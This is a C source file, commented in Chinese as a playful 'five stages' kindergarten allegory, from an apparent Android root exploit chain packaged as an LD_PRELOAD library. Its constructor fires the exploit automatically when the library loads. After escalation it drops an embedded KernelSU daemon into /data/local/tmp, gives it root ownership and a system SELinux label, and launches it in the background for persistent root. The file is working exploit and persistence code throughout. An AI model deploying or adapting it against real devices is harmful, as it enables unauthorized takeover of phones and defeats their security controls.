/* ==========================================================================
 * 【第 5 关】安插自己的管家 —— 嵌入式 KernelSU(ksud) 持久化
 * ==========================================================================
 * 怕下次进幼儿园还要重新闯五关？把一个忠诚的小机器人(ksud)藏在
 * 魔法道具(preload.so)里带进来：
 *
 *   embedded_ksud_start/end = 小机器人本体(编译时嵌进 .so 的二进制)
 *   install_embedded_ksud() = 第 4 关戴上徽章后立刻执行：
 *       1. 把小机器人写到 /data/local/tmp/ksud(园长助手工位)
 *       2. 给它盖好章(chown 0:0 / chmod 755 / chcon 语境)
 *       3. 派它上岗(ksud --daemon 后台常驻)
 *   以后其他小朋友想当助手，直接找它盖章就行，不用再闯五关。
 *
 * load() constructor = 道具塞进书包的瞬间(LD_PRELOAD 加载)自动开演：
 * 前四关全部从这里发起。
 * ========================================================================== */

#include "common.h"

extern const unsigned char embedded_ksud_start[];
extern const unsigned char embedded_ksud_end[];

static int write_full(int fd, const void *buf, size_t len) {
  const unsigned char *p = buf;
  while (len) {
    ssize_t n = write(fd, p, len);
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n <= 0) {
      return 0;
    }
    p += n;
    len -= (size_t)n;
  }
  return 1;
}

static void try_chcon(const char *path) {
  pid_t pid = fork();
  if (pid == 0) {
    execl("/system/bin/chcon", "chcon", "u:object_r:system_file:s0",
          path, (char *)NULL);
    _exit(127);
  }
  if (pid > 0) {
    while (waitpid(pid, NULL, 0) < 0 && errno == EINTR) {
    }
  }
}

/* 【小机器人上岗】写到助理工位 -> 盖园长的章(root 属主+可执行+SELinux 语境)
 * -> rename 到正式工位(原子落位，不留半截文件)。 */
static int write_embedded_ksud_file(const char *dir, const char *dst) {
  char tmp[256];
  snprintf(tmp, sizeof(tmp), "%s/.ksud.new.%d", dir, getpid());
  unlink(tmp);

  size_t size = (size_t)(embedded_ksud_end - embedded_ksud_start);
  int fd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
  if (fd < 0) {
    return 0;
  }
  int ok = write_full(fd, embedded_ksud_start, size);
  int saved_errno = errno;
  if (ok) {
    fchown(fd, 0, 0);
    ok = fchmod(fd, 0755) == 0;
    saved_errno = errno;
  }
  if (close(fd) != 0 && ok) {
    ok = 0;
    saved_errno = errno;
  }
  if (!ok) {
    unlink(tmp);
    errno = saved_errno;
    return 0;
  }

  try_chcon(tmp);
  if (rename(tmp, dst) != 0) {
    saved_errno = errno;
    unlink(tmp);
    errno = saved_errno;
    return 0;
  }
  try_chcon(dst);
  pr_success("embedded ksud wrote %zu bytes to %s\n", size, dst);
  return 1;
}

static pid_t start_ksud_late_load(const char *path) {
  pid_t pid = fork();
  if (pid == 0) {
    setsid();
    int null_fd = open("/dev/null", O_RDONLY | O_CLOEXEC);
    if (null_fd >= 0) {
      dup2(null_fd, STDIN_FILENO);
    }

    long max_fd = sysconf(_SC_OPEN_MAX);
    if (max_fd < 0 || max_fd > 65536) {
      max_fd = 65536;
    }
    for (int fd = STDERR_FILENO + 1; fd < max_fd; fd++) {
      close(fd);
    }
    execl(path, "ksud", "--daemon", (char *)NULL);
    _exit(127);
  }
  return pid;
}

/* 【第 5 关执行】第 4 关的 root 小朋友提权成功后立即调用：
 * 落盘小机器人 -> 启动 ksud --daemon 常驻幼儿园。 */
int install_embedded_ksud(void) {
  if (!write_embedded_ksud_file("/data/local/tmp", "/data/local/tmp/ksud")) {
    return 0;
  }

  pid_t pid = start_ksud_late_load("/data/local/tmp/ksud");
  if (pid <= 0) {
    return 0;
  }

  pr_success("embedded ksud daemon started pid=%d path=/data/local/tmp/ksud\n", pid);
  return 1;
}

/* 【日志文件分流】LOG_FILE 环境变量指定路径时，fork 一个 tee 进程把
 * stdout/stderr 同时写进文件。exploit 崩溃/重启后也能从文件里查现场。 */
static void setup_log_file(void) {
  char *log_path = getenv("LOG_FILE");
  if (!log_path || !*log_path) {
    return;
  }
  int log_fd = open(log_path, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644);
  if (log_fd < 0) {
    return;
  }
  /* 用 pipe + tee 子进程：printf 照常输出，同时镜像到文件 */
  int pipefd[2];
  if (pipe2(pipefd, O_CLOEXEC) != 0) {
    close(log_fd);
    return;
  }
  pid_t pid = fork();
  if (pid == 0) {
    /* child: tee 进程，读 pipe 写 log_fd + 原始 stdout */
    int orig_out = dup(STDOUT_FILENO);
    close(pipefd[1]);
    char buf[4096];
    for (;;) {
      ssize_t n = read(pipefd[0], buf, sizeof(buf));
      if (n <= 0) break;
      if (orig_out >= 0) write(orig_out, buf, n);
      write(log_fd, buf, n);
    }
    _exit(0);
  }
  if (pid > 0) {
    close(pipefd[0]);
    close(log_fd);
    dup2(pipefd[1], STDOUT_FILENO);
    dup2(pipefd[1], STDERR_FILENO);
    close(pipefd[1]);
  }
}

/* 【魔法道具启动】小朋友一背起书包(LD_PRELOAD 加载 .so)就自动开演：
 * 摘掉 LD_PRELOAD 环境变量(别让后续 exec 的程序再触发一次)，
 * 然后直接 run_exploit() 闯五关。 */
__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;

  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  /* LOG_FILE 先于任何 pr_* 输出设置，保证第一行也能落盘 */
  setup_log_file();

  unsetenv("LD_PRELOAD");

  char *argv[2] = {
    "preload.so",
    NULL,
  };

  pr_success("preload starting pid=%d\n", getpid());
  run_exploit(1, argv);
}
